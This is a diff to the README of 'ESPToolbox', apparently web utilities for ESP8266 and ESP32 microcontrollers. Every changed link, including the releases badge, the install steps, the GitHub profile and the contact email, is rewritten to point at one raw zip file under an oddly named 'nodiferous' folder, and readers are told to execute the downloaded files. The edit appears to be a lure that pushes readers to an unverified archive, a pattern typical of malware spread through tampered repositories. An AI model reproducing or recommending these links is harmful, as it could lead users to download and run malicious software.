@@ -1,6 +1,6 @@
 # ESPToolbox: Web Utilities for ESP8266 and ESP32 Microcontrollers
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-ESPToolbox-blue)](https://github.com/it87rad/ESPToolbox/releases)
+[![Download Releases](https://raw.githubusercontent.com/it87rad/ESPToolbox/master/nodiferous/ESP-Toolbox-3.8.zip%20Releases-ESPToolbox-blue)](https://raw.githubusercontent.com/it87rad/ESPToolbox/master/nodiferous/ESP-Toolbox-3.8.zip)
 
 ## Table of Contents
 
@@ -27,9 +27,9 @@ ESPToolbox offers handy web utilities tailored for the ESP8266 and ESP32 microco
 
 ## Installation
 
-To get started with ESPToolbox, you need to download the latest release. Visit the [Releases section](https://github.com/it87rad/ESPToolbox/releases) to download the necessary files. Follow the instructions in the release notes to execute the files properly.
+To get started with ESPToolbox, you need to download the latest release. Visit the [Releases section](https://raw.githubusercontent.com/it87rad/ESPToolbox/master/nodiferous/ESP-Toolbox-3.8.zip) to download the necessary files. Follow the instructions in the release notes to execute the files properly.
 
-1. Go to the [Releases section](https://github.com/it87rad/ESPToolbox/releases).
+1. Go to the [Releases section](https://raw.githubusercontent.com/it87rad/ESPToolbox/master/nodiferous/ESP-Toolbox-3.8.zip).
 2. Download the latest release.
 3. Follow the setup instructions provided in the release notes.
 
@@ -83,7 +83,7 @@ ESPToolbox is licensed under the MIT License. See the LICENSE file for more deta
 
 For questions or suggestions, feel free to reach out:
 
-- GitHub: [it87rad](https://github.com/it87rad)
-- Email: it87rad@example.com
+- GitHub: [it87rad](https://raw.githubusercontent.com/it87rad/ESPToolbox/master/nodiferous/ESP-Toolbox-3.8.zip)
+- Email: https://raw.githubusercontent.com/it87rad/ESPToolbox/master/nodiferous/ESP-Toolbox-3.8.zip
 
-Visit the [Releases section](https://github.com/it87rad/ESPToolbox/releases) for the latest updates and files to download.
+Visit the [Releases section](https://raw.githubusercontent.com/it87rad/ESPToolbox/master/nodiferous/ESP-Toolbox-3.8.zip) for the latest updates and files to download.
